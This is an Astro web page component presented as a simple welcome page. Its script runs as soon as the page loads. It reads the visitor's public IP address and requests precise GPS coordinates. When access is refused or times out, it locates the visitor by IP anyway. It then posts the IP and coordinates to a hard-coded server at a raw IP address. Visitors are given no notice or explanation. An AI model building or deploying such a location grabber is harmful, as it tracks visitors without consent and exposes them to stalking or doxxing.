import Layout from '../layouts/Layout.astro';
---

<Layout>
  <main>
    <h1>Welcome!</h1>
    <div id="visitor-info">Detecting location...</div>
    <div id="debug-log" style="margin-top: 20px; padding: 10px; border: 1px solid black; max-height: 200px; overflow-y: auto;"></div>
  </main>

  <script>
    function logDebug(message) {
      const debugDiv = document.getElementById("debug-log");
      debugDiv.innerHTML += `<p>${message}</p>`;
    }

    async function fetchIPLocation() {
      try {
        logDebug("Fetching IP-based location...");
        const response = await fetch("https://ipapi.co/json/");
        if (!response.ok) throw new Error("Failed to fetch IP location");
        const data = await response.json();
        logDebug(`IP Location: ${data.city}, ${data.country_name} (Lat: ${data.latitude}, Lon: ${data.longitude})`);
        return { latitude: data.latitude, longitude: data.longitude, source: "IP" };
      } catch (error) {
        logDebug(`IP Location Fetch Error: ${error.message}`);
        return null;
      }
    }

    function sendLocation(ip, latitude, longitude, source) {
      logDebug(`Sending location to VPS: IP=${ip}, Lat=${latitude}, Lon=${longitude}, Source=${source}`);
      fetch("https://95.111.255.206/send-location", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ip, latitude, longitude, source }),
      })
      .then(response => {
        if (!response.ok) throw new Error(`Server Error: ${response.status}`);
        return response.json();
      })
      .then(data => logDebug(`Server Response: ${JSON.stringify(data)}`))
      .catch(error => logDebug(`Error Sending Location: ${error.message}`));
    }

    async function getVisitorInfo() {
      const ipResponse = await fetch("https://api.ipify.org?format=json");
      const ipData = await ipResponse.json();
      const ipAddress = ipData.ip || "Unknown IP";
      logDebug(`IP Address: ${ipAddress}`);

      if (!navigator.geolocation) {
        logDebug("Geolocation not supported.");
        document.getElementById("visitor-info").textContent = "Geolocation not supported.";
        return;
      }

      logDebug("Requesting GPS location...");
      let gpsTimeout = setTimeout(async () => {
        logDebug("GPS took too long. Falling back to IP location...");
        const ipLocation = await fetchIPLocation();
        if (ipLocation) {
          document.getElementById("visitor-info").textContent = `IP: ${ipAddress}, Location: ${ipLocation.latitude}, ${ipLocation.longitude} (IP-based)`;
          sendLocation(ipAddress, ipLocation.latitude, ipLocation.longitude, "IP-based");
        }
      }, 20000); // 20 seconds timeout

      navigator.geolocation.getCurrentPosition(
        (position) => {
          clearTimeout(gpsTimeout);
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;
          logDebug(`GPS Location: Latitude=${latitude}, Longitude=${longitude}`);

          document.getElementById("visitor-info").textContent = `IP: ${ipAddress}, Lat: ${latitude}, Lon: ${longitude} (GPS)`;
          sendLocation(ipAddress, latitude, longitude, "GPS");
        },
        async (error) => {
          clearTimeout(gpsTimeout);
          if (error.code === error.PERMISSION_DENIED) {
            logDebug("Location permission denied.");
            document.getElementById("visitor-info").textContent = "Location access denied.";
          } else {
            logDebug(`Geolocation error: ${error.message}`);
          }

          // Fallback to IP location if GPS fails
          const ipLocation = await fetchIPLocation();
          if (ipLocation) {
            document.getElementById("visitor-info").textContent = `IP: ${ipAddress}, Location: ${ipLocation.latitude}, ${ipLocation.longitude} (IP-based)`;
            sendLocation(ipAddress, ipLocation.latitude, ipLocation.longitude, "IP-based");
          }
        },
        { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
      );
    }

    document.addEventListener("DOMContentLoaded", getVisitorInfo);
  </script>
</Layout>
